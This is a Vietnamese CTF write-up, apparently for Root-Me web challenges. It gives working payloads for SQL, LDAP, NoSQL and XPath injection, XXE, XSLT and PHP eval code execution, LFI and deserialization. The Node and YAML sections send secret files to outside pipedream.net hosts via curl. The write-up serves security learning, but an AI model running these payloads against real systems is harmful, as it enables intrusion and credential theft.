## 41. SQL injection - Authentication - GBK
- GBK là phần ký tự Trung Quốc giản thể. GBK bao gồm tất cả ký tự Trung Quốc được định nghĩa trong unicode.
- Thường thì bên server sẽ sử dụng để bypass hàm addslashes().
- addslashes() dùng để thêm một dấu gạch chéo ngược (\\) phía trước các ký tự là dấu nháy kép, dấu nháy đơn và dấu gạch chéo ngược trong chuỗi.
- Do đó nếu thêm dấu ' vào thì nó sẽ thành \\' thêm slashes vào.
- Vì vậy giải pháp là chuyển thành GBK thì sẽ bypass được.
- Đầu tiên họ cho trang login thì chuyển login thành mảng để xem lỗi và họ báo lỗi dùng addslashes().
```js
login[]=admin&password=admin
```
- Vì kí tự %bf%5c hay %af%5c là ký tự Trung Quốc nên ta chỉ gần thêm %bf thì hàm sẽ thêm %5c(\\) vô sau và trở thành ký tự Trung Quốc.
```js
-- -: là comment trên mysql
': là %27
payload: login=%bf' or 1 = 1 -- -&& password = admin
Ấn chuyển hướng trang =>
Congratz! The validation password is: iMDaFlag1337!
```

## 42. SQL injection - String
- Đầu tiên tìm lỗi thì thấy ở thanh search khi nhập dấu ' báo lỗi  SQLite3::query(): nên ta biết họ dùng SQLite3.
- Tìm kiếm số bảng thì thấy có 2 bảng.
```js
payload: recherche = 1' order by 3--
=> bị lỗi nên có 2 bảng.
```
- Khai thác union query tìm kiếm tên bảng tìm được bảng news và users.
```js
payload: recherche=1' union select NULL,sql from sqlite_master--
```
- Rồi xem thông tin users
```js
payload: recherche=1' union select username,password from users--
=> username = admin , password = c4K04dtIaJsuWdi
```
## 43. XSLT - Code execution
- XSLT (viết tắt của tiếng Anh XSL Transformations) là một ngôn ngữ dựa trên XML dùng để biến đổi các tài liệu XML. Tài liệu gốc thì không bị thay đổi; mà thay vào đó, một tài liệu XML mới được tạo ra dựa trên nội dung của tài liệu cũ. Tài liệu mới có thể là có định dạng XML hay là một định dạng nào đó khác, như HTML hay văn bản thuần. XSLT thường dùng nhất trong việc chuyển đổi dữ liệu giữa các lược đồ XML hay để chuyển đổi dữ liệu XML thành các trang web hay tài liệu dạng PDF.
- Bài này truyền file .xsl dưới tham số xsl.
- Dùng pastebin để tạo ra đoạn code xsl check xem có attack được không.
```js
<?xml version="1.0" encoding="utf-8"?> 
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"> 
	<xsl:template match="/"> 
		XSLT Version : <xsl:value-of select="system-property('xsl:version')"/> 
		XSLT Vendor : <xsl:value-of select="system-property('xsl:vendor')"/> 
		XSLT Vendor URL : <xsl:value-of select="system-property('xsl:vendor-url')"/> 
	</xsl:template> 
</xsl:stylesheet>
```
![Screenshot 2022-05-21 094955](https://i.imgur.com/GlEy1vo.png)
- Có thể tân công được vậy lôi dirpath ra xem thôi. Có một số cách đọc folder có thể tham khảo tại đây.
https://security.stackexchange.com/questions/170712/execute-a-php-function-that-returns-an-array-from-an-xsl-file
- Đọc file với code
```js
<?xml version="1.0" encoding="utf-8"?> 
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"> 
	<xsl:template match="/"> 
		<xsl:value-of select="php:function('opendir','.')"/>
		<xsl:value-of select="php:function('readdir')"/> /
		<xsl:value-of select="php:function('readdir')"/>  /
		<xsl:value-of select="php:function('readdir')"/>/
                <xsl:value-of select="php:function('readdir')"/>/
                <xsl:value-of select="php:function('readdir')"/>/
                <xsl:value-of select="php:function('readdir')"/>/
                <xsl:value-of select="php:function('readdir')"/>/
                <xsl:value-of select="php:function('readdir')"/>/
                <xsl:value-of select="php:function('readdir')"/>/
                <xsl:value-of select="php:function('readdir')"/>/
                <xsl:value-of select="php:function('readdir')"/>/
                <xsl:value-of select="php:function('readdir')"/>/
                ....
	</xsl:template> 
</xsl:stylesheet>
```
![Screenshot 2022-05-21 095627](https://i.imgur.com/Y0BARuS.png)
- Có cái folder nghi nghi mở ra là có flag.
![Screenshot 2022-05-21 095746](https://i.imgur.com/MLlNRfO.png)
```js
<?xml version="1.0" encoding="utf-8"?> 
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"> 
	<xsl:template match="/"> 
		<xsl:value-of select="php:function('file_get_contents','.6ff3200bee785801f420fba826ffcdee/.passwd')"/>
	</xsl:template> 
</xsl:stylesheet>
```
```js
Password: X5L7_R0ckS
```

## 44. LDAP injection - Authentication
- Xác thực nguời dùng đơn giản (Simple Authtication)
. Đối với xác thực nguời dùng đơn giản, tên đăng nhập trong DN được gửi kèm cùng với một mật khẩu dưới dạng clear text tới máy chủ LDAP.
Máy chủ sẽ so sánh mật khẩu với giá trị thuộc tính userPassword hoặc với những giá trị thuộc tính đã được định nghĩa truớc trong entry cho DN đó.
. Nếu mật khẩu được lưu dưới dạng bị băm (mã hoá), máy chủ sẽ sử dụng hàm băm tương ứng để biến đối mật khẩu đưa vào và so sánh giá trị đó với giá trị mật khẩu đã mã hoá từ trước.
. Nếu cả hai mật khẩu trùng nhau, việc xác thực client sẽ thành công.
- Đầu tiên đề bài sẽ đưa ra 2 form input username và password.
- Vì đây là LDAP injection nên check bằng ")" xem thì bị trả về lỗi.
```js
Username=)
ERROR : Invalid LDAP syntax : (&(uid=))(userPassword=))
```
- Theo lý thuyết thì có thể điền 
```js
(&(uid=*)(userPassword=*))
- Nhưng hình như userPassword đã bị filter "*" nên không thực hiện được
```
- Payload:
```js
Username= *)(|(1=1
Password= *)

=> (&(uid=*)(|(1=1)(userPassword=*))
- Thì 2 vế luôn đúng nên thành công.
- Chú ý là chủ yếu bypass dấu * của Password chứ vế (1=1) không quan trọng có thể thay thế (1=0),('a'='b') thì nó vẫn đúng thôi.

=> Flag: SWRwehpkTI3Vu2F9DoTJJ0LBO
```
## 45. Node - Serialize
- Ban đầu họ cho cái login thì đăng nhâp admin admin vô. Thấy tự động serialize cái data login và base64 nó lên cookie profile.
- Có thể họ xác nhận đăng nhập bằng cookie vậy nên trong server phải có deserialize thì mới check login được.
- Có thể truyền payload để thực thi câu lệnh ở trên server và trả về binrequest.
```js
payload: profile = {
    "userName":"admin","passWord":"_$$ND_FUNC$$_function (){
      require('child_process').exec('curl -X POST https://eoju8jq9sf7c3et.m.pipedream.net -d \" $(cat ./flag/secret) \"',function(error, stdout, stderr) 
      {
        console.log(stdout) ;
      } 
      );
    }()"
  }
```
- Flag: 
![Screenshot 2022-05-24 093605](https://i.imgur.com/vhzuqf4.png)

## 46. NodeJS - Prototype Pollution Bypass
- Prototype là cơ chế mà các object trong javascript kế thừa các tính năng từ một object khác. Tất cả các object trong javascript đều có một prototype, và các object này kế thừa các thuộc tính (properties) cũng như phương thức (methods) từ prototype của mình.
- Một số lưu ý
```js
  object.constructor.prototype = object.__proto__
```

## 47. NoSQL injection - Authentication
- Mở đầu thì thấy form đăng nhập thì đây là lỗi về nosql.
- Bật burp suite thao tác cho dễ.
- Đầu tiên vẫn dùng admin và admin thì nhận về bị bad request.
- Dùng cú pháp của nosql xem thử.
```js
GET /web-serveur/ch38/?login[$ne]=admin&pass[$ne]=admin HTTP/1.1

$ne: là so sánh không bằng (khác)
You are connected as : test
```
- Chuyển sang so sánh với test xem.
```js
GET /web-serveur/ch38/?login[$ne]=test&pass[$ne]=admin
You are connected as : admin
```
- Có nghĩa là ngoài test và admin còn một số user khác nên dùng $lt(lest than) và $gt(greater than) để xem khoảng ở giữa.
```js
GET /web-serveur/ch38/?login[$lt]=test&login[$gt]=admin&pass[$ne]=admin
You are connected as : flag{nosqli_no_secret_4_you}
```

## 48. PHP - Path Truncation
- Không thể truy cập được trang admin.html vì có thể khi truyền ?page=admin thì sẽ mặc định thêm .php vào đằng sau.
- Xử lý bằng việc ngắt chuỗi bằng "%00" nhưng không được chắc bị filter rồi.
- Lỗi PHP PATH TRUNCATION xuất hiện ở PHP < 5.3 là việc tham số của php chỉ đạt được 4096 ký tự nếu quá thì tự động loại bỏ.
- Giả sử
```js
  ls ./folder/./././././././././ thì cũng chỉ liệt kê folder ấy thôi.
```
- Nên ta chèn "./" vào sau để overwrite cái biến page.
- Payload: 
```js
python -c "print('a/../admin.html/'+'./'*2048)"

Congratz! The flag is 110V3TrUnC4T10n
```

## 49. PHP - Serialization
- Đầu tiên thì có form đăng nhập và họ hướng dẫn đăng nhập bằng guest/guest với autologin.
- Đọc file source lên thấy có 2 cách để login: đăng nhập theo username và password hoặc đăng nhập bằng cookie autologin.
```js
if($_SESSION['login'] === "superadmin"){
    require_once('admin.inc.php');
}
```
- Như vậy là login là "superadmin" và trong session[login] là được.
- Để tạo ra session[login] thì phải bypass qua hàm này
```js
if ($data['password'] == $auth[ $data['login'] ] ) {
        $_SESSION['login'] = $data['login'];

        // set cookie for autologin if requested
        if($_POST['autologin'] === "1"){
            setcookie('autologin', serialize($data));
        }
    }
```
- Hàm này là một hàm so sánh lỏng lẻo nếu truyền data[password] vào là true thì so sánh giữa true với chuỗi luôn đúng.
```js
if ($data['password'] == $auth[ $data['login'] ] )
```
```js
payload: 
autologin=a:2:{s:5:"login";s:10:"superadmin";s:8:"password";b:1;}
Flag: NoUserInputInPHPSerialization!
```
![Screenshot 2022-05-24 111841](https://i.imgur.com/vLVUqbT.png)
## 50. SQL injection - Numeric
- Đầu tiên họ cho 1 form đăng nhập sau khi dò thì tìm được lỗi sql trên thanh url và dùng SQLite3.
- Đầu tiên vẫn kiểm tra số cột có thể tấn công.
```js
news_id=1 order by 10--
Warning: SQLite3::query(): Unable to prepare statement: 1, 1st ORDER BY term out of range - should be between 1 and 3 in /challenge/web-serveur/ch18/index.php on line 80
1st ORDER BY term out of range - should be between 1 and 3
```
- Có vẻ là có 3 cột.
```js
news_id=1 union select 1,2,3--
News
2
3
=> Chỉ có thể tấn công vào cột 2,3.
```
- Tiếp tra số bảng
```js
news_id=1 union select NULL,NULL,sql from sqlite_master--


CREATE TABLE news(id INTEGER, title TEXT, description TEXT)
CREATE TABLE users(username TEXT, password TEXT, Year INTEGER)
```
- Vô đọc bảng users thôi.
```js
news_id=1 union select NULL,username,password from users--

username = admin
password = aTlkJYLjcbLmue3
```

## 51. SQL Injection - Routed
- SQL Injection - Routed là cách tiêm vào để thoát được 2 query lồng nhau do Routed lấy kết quả của query trước để làm tài nguyên cho câu query sau.
- Tìm thì thấy lỗ hổng ở thanh search. Vì là query lồng nhau nên tìm số bảng đầu tiên.
```js
login='union select 1' order by 10 -- - -- -

Attack detected!
```
- Vì key order by đã bị FILTER nên tìm hiểu thì có thể dùng mã hex để bypass. Qua thử từng cái thì tìm được có 2 cột.
```js
login='union select 1' order by 3 -- - -- -
=> login='union select 1' 0x276f726465722062792033202d2d202d -- -
Unknown column '3' in 'order clause'
```
- Sau khi thử select 1,2 thì có thể khai thác được cả 2 cột.
- Tiếp đến tìm tên DB có thể xem cheat sheet ở đây
##### https://portswigger.net/web-security/sql-injection/cheat-sheet
```js
login='union select 'union select NULL,@@version-- - -- -
=> login='union select 0x27756e696f6e2073656c65637420404076657273696f6e2e4e554c4c2d2d202d -- -

[+] Requested login: ' union select 0x27756e696f6e2073656c656374204e554c4c2c404076657273696f6e2d2d202d -- -<br>
[+] Found ID: <br>
[+] Email: 10.3.34-MariaDB-0ubuntu0.20.04.1<br>
```
- Vì MariaDB khá tương đồng với MySQL nên dùng cheat sheet của MySQL luôn.
- Tìm tên bảng.
```js
login='union select ' union select NULL,table_name from information_schema.tables where table_schema = database() -- - -- -
=> login = 'union select ' 0x27756e696f6e2073656c656374204e554c4c2c7461626c655f6e616d652066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d61203d2064617461626173652829202d2d202d  -- -

[+] Requested login: ' union select 0x27756e696f6e2073656c656374204e554c4c2c7461626c655f6e616d652066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d61203d2064617461626173652829202d2d202d -- -<br>
[+] Found ID: <br>
[+] Email: users<br>
```
- Hiện tên cột trong bảng user
```js
login='union select ' union SELECT NULL,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users'-- - -- -
=> login = 'union select ' 0x2720756e696f6e2053454c45435420312c67726f75705f636f6e63617428636f6c756d6e5f6e616d65292046524f4d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73205748455245207461626c655f6e616d65203d20277573657273272d2d202d  -- -

[+] Found ID: 1<br>
[+] Email: id,login,password,email<br>
```
- Hiện login và password là xong.

```js
login='union select 'union SELECT NULL,group_concat(login,'-',password) FROM users-- - -- -
=> login = 'union select ' 0x27756e696f6e2053454c454354204e554c4c2c67726f75705f636f6e636174286c6f67696e2c27202d20272c70617373776f7264292046524f4d2075736572732d2d202d  -- -

[+] Email: admin - qs89QdAs9A,jean - superpass,michel - mypass<br>
```

## 52. SQL Truncation
- Truncation nghĩa là cắt bớt input.
- Đọc source code thì có phần gợi ý về bảng user
```js
<!--
CREATE TABLE IF NOT EXISTS user(   
	id INT NOT NULL AUTO_INCREMENT,
    login VARCHAR(12),
    password CHAR(32),
    PRIMARY KEY (id));
-->
```
- Thì trang web có cho 2 path đăng kí và đăng nhập. Đầu tiên đăng kí tài khoản admin thì nó báo đã tồn tại nên việc bây giờ là bypass admin.
- Vì cột login chỉ có 12 kí tự nên nếu ta điền vượt quá thì nó sẽ tự động cắt bớt nên sẽ điền như sau.
```js
login = admin       aaaa
password = 12345678
=> admin: 5 ký tự nên cần thêm 7 ký tự trắng nữa là được   

Well done ! Flag de validation / Validation flag : J41m3Qu4nD54Tr0nc
```
## 53. XML External Entity
- Đây là lỗi XXE cơ bản nên đọc thẳng file index.php là xong.
- Dùng filter stream php tại bị filter 1 số lệnh.
- Payload
```js
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE rss [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"> 
]>
<rss version="2.0">

<channel>
  <title>W3Schools Home Page</title>
  <link>https://www.w3schools.com</link>
  <description>Free web building tutorials</description>
  <item>
    <title>&xxe;</title>
    <link>https://www.w3schools.com/xml/xml_rss.asp</link>
    <description>New RSS tutorial on W3Schools</description>
  </item>
  <item>
    <title>XML Tutorial</title>
    <link>https://www.w3schools.com/xml</link>
    <description>New XML tutorial on W3Schools</description>
  </item>
</channel>

</rss>
```
![Screenshot 2022-05-21 161605](https://i.imgur.com/7h5nfRt.png)
- Gửi bằng pastebin thì được decode base64 thì được đoạn này.
```js
 if(isset($_POST['username'], $_POST['password']) && !empty($_POST['username']) && !empty($_POST['password']))
    {
        $user=$_POST["username"];
        $pass=$_POST["password"];
        if($user === "admin" && $pass === "".file_get_contents(".passwd").""){
            print "Flag: ".file_get_contents(".passwd")."<br />";
        }
    }
```
- Đọc file .passwd là xong.
```js
Flag: c934fed17f1cac3045ddfeca34f332bc
```
## 54. 	XPath injection - Authentication
- Thì ban đầu họ cho một bảng user bằng XML có vẻ cần đăng nhập vào admin John
![Screenshot 2022-05-21 163842](https://i.imgur.com/eqOPOgD.png)
- Vì đây là xác thực theo XPath nên có thể hình dung ra được cách login
```js
String xpathQuery = "//user[name/text()='" + request.get("username") + "' And password/text()='" + request.get("password") + "']";
```
- Payload là:
```js
username: John' or '1'='1
password: abcd

=> String xpathQuery = "//user[name/text()='John' or '1'='1 ' And password/text()='abcd']";

Flag: 6FkC67ui8njEepIK5Gr2Kwe
```
## 55. Yaml - Deserialization
- YAML là 1 định dạng dũ liệu trung gian được thiết kế để người dùng và các ngôn ngữ lập trình cùng hiểu được. YAML được dùng vào mục đích tương tự JSON, XML nhưng nó lại có nhiều tính năng nổi bật hơn vì cấu trúc dữ liệu linh hoạt hơn, hỗ trợ nhiều ngôn ngữ lập trình, diễn đạt và mở rộng dữ liệu hơn và dễ sử dụng vì khá có nhiều kiểu dữ liệu lập trình.
- Khởi đầu thì họ cho dữ liệu kiểu yaml truyền qua thanh url.
- Khi deserialize yaml với load thì function trong data có thể sẽ thực thi nên đọc được file.
- Payload:
```js
yaml: !!python/object/apply:os.system ['curl -X POST https://eoj7k4x1ldxqxe7.m.pipedream.net -d "$(cat .passwd)"']
=> encode base64 r gửi qua url là thành công.
```
![Screenshot 2022-05-24 160820](https://i.imgur.com/tuaWQMz.png)

## 58. Local File Inclusion - Wrappers
- Thì đầu tiên thử LFI bình thường ../../../etc/passwd thì bị filter rồi.
- Đề bài hướng dẫn là dùng Wrappers thêm cả LFI thì sau 1 hồi tra mạng thì họ hướng dẫn dùng file zip.
```js
- Tạo 1 file tên a.php
<?php
        echo file_get_contents("index.php");
?>
- Zip nó rồi chuyển sang đuôi jpg
$ zip a.zip a.php
$ mv a.zip a.jpg
- Up nó lên rồi đọc với trường page=zip://tmp/uploads/tenfile.jpg%23tenfilephp 
```
  ![Screenshot 2022-05-24 143630](https://i.imgur.com/LmuIQTF.png)
- Đọc được rồi giờ dò file path là ok nhưng vì server filter system và exec nên dùng lệnh scandir.
```php
<?php
  $scan = scandir('./'); 
  foreach($scan as $file){
    echo $file;
  }
?>
```
![Screenshot 2022-05-24 144244](https://i.imgur.com/NkCw2ny.png)
- Đọc file đó là có flag.
```js
<?php
        echo file_get_contents("./flag-mipkBswUppqwXlq9ZydO.php");      
?>
```

![Screenshot 2022-05-24 144947](https://i.imgur.com/Yw9mdgG.png)

## 59. PHP - Eval
- Đầu tiên nhìn source thấy phần input có hàm eval input.
```js
if (isset($_POST['input'])) {
    if(!preg_match('/[a-zA-Z`]/', $_POST['input'])){
        print '<fieldset><legend>Result</legend>';
        eval('print '.$_POST['input'].";");
        print '</fieldset>';
    }
    else
        echo "<p>Dangerous code detected</p>";
}
```
- Quan trọng là có thể bypass qua hàm check không được điền chữ cái kia.
- Thuật toán có thể tham khảo đây.
https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/
- Cơ bản là tạo ký tự "A" rồi từ đó tăng dần lên để kiểm soát bảng chữ cái.
```js
- Tạo kí tự A:
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A

=> Ký tự B là $_++; rồi dần dần tìm chữ cái cần muốn rồi nối chuỗi vào là xong.
=> Chuỗi cần điền: SYSTEM(CAT[STRTOLOWER(.PASSWD())])
```
payload:
```js
$_=[];
$_=@"$_"; 
$_=$_['!'=='@']; ;
$___=$_; 
$__ = $_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$___=$__; 
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;
$___.=$__; 
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;
$___.=$__; 
$__ = $_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$___.=$__; 
$__=$_;
++$__;++$__;++$__;++$__; 
$___.=$__; 
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;
$___.=$__;
$__=$_;

$_____ = '';
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;

$____='';
++$__;++$__;
$____.=$__;
$__=$_;
$____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$____.=$__;
$__=$_;

$______='.';
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$______.=$__;
$__=$_;
$______.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$______.=$__;
$______.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$______.=$__;
$__=$_;
++$__;++$__;++$__;
$______.=$__;
$__=$_;
$__________ = $____." ".$______ ;
$___($_____($__________ ))
```

```js
Flag: M!xIng_PHP_w1th_3v4l_L0L
```

